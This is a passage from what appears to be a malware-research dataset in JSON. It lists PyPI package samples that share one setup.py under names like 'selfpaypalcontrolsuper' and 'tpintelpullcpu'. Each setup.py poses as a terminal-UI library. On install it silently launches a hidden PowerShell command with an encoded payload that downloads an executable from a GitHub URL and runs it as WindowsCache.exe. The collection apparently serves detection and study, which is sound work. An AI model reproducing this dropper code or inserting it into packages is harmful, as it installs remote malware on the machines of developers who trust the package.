        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selflibmineload',\n    packages = ['modlib'],\n    version = '6.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfosintgrandrandom-v2.67",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfosintgrandrandom',\n    packages = ['modlib'],\n    version = '3.75',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfpaypalcontrolsuper-v5.71",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpaypalcontrolsuper',\n    packages = ['modlib'],\n    version = '10.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfproofstudyrand-v1.59",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfproofstudyrand',\n    packages = ['modlib'],\n    version = '2.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-selfrandompullver-v1.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfrandompullver',\n    packages = ['modlib'],\n    version = '1.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-tpintelpullcpu-v9.31",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpintelpullcpu',\n    packages = ['modlib'],\n    version = '9.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-tpreloadad-v1.68",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreloadad',\n    packages = ['modlib'],\n    version = '9.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-07-tpstringcraftget-v6.42",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstringcraftget',\n    packages = ['modlib'],\n    version = '8.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-vmpullinfo-v10.66",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-vmpullinfo',\n    packages = ['modlib'],\n    version = '6.35',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcandyhttpnvidia-v8.55",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcandyhttpnvidia',\n    packages = ['modlib'],\n    version = '8.10',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcvedpep-v3.25",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcvedpep',\n    packages = ['modlib'],\n    version = '10.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfreplacetoolreplace-v4.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplacetoolreplace',\n    packages = ['modlib'],\n    version = '2.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tppushvmgrand-v8.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppushvmgrand',\n    packages = ['modlib'],\n    version = '8.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqhackedlgtbpip-v5.4",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhackedLGTBpip',\n    packages = ['modlib'],\n    version = '2.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-esqccpullvirtual-v5.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccpullvirtual',\n    packages = ['modlib'],\n    version = '8.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfstrresuper-v3.23",
